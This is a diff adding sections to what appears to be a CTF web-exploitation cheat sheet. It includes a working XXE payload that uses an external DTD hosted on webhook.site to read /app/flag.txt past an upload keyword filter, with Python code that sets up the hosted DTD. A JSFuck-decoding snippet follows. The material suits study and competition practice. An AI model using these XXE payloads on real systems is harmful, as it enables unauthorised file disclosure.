@@ -204,6 +204,45 @@ dalfox url http://target/?q=test             # XSS
 - Compute PIN using Werkzeug's algorithm
 - Execute arbitrary Python in debugger console
 
+## XXE with External DTD Filter Bypass
+
+**Pattern (PDFile, PascalCTF 2026):** Upload endpoint filters keywords ("file", "flag", "etc") in uploaded XML, but external DTD fetched via HTTP is NOT filtered.
+
+**Technique:** Host malicious DTD on webhook.site or attacker server:
+```xml
+<!-- Remote DTD (hosted on webhook.site) -->
+<!ENTITY % data SYSTEM "file:///app/flag.txt">
+<!ENTITY leak "%data;">
+```
+
+```xml
+<!-- Uploaded XML (clean, passes filter) -->
+<?xml version="1.0"?>
+<!DOCTYPE book SYSTEM "http://webhook.site/TOKEN">
+<book><title>&leak;</title></book>
+```
+
+**Key insight:** XML parser fetches and processes external DTD without applying the upload keyword filter. Response includes flag in parsed field.
+
+**Setup with webhook.site API:**
+```python
+import requests
+TOKEN = requests.post("https://webhook.site/token").json()["uuid"]
+dtd = '<!ENTITY % d SYSTEM "file:///app/flag.txt"><!ENTITY leak "%d;">'
+requests.put(f"https://webhook.site/token/{TOKEN}/request/...",
+             json={"default_content": dtd, "default_content_type": "text/xml"})
+```
+
+## JSFuck Decoding
+
+**Pattern (JShit, PascalCTF 2026):** Page source contains JSFuck (`[]()!+` only). Decode by removing trailing `()()` and calling `.toString()` in Node.js:
+```javascript
+const code = fs.readFileSync('jsfuck.js', 'utf8');
+// Remove last () to get function object instead of executing
+const func = eval(code.slice(0, -2));
+console.log(func.toString());  // Reveals original code with hardcoded flag
+```
+
 ## Common Flag Locations
 
 ```
